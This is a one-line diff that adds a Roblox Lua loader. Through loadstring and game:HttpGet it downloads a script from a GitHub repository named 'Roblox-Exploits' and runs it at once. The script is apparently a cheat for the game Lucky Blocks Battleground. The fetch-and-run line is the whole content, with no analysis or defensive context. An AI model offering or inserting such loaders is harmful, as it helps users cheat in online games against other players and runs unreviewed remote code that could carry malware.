@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/peer-pri/Roblox-Exploits/main/Exploits/lucky-blocks-battleground.lua",true))()
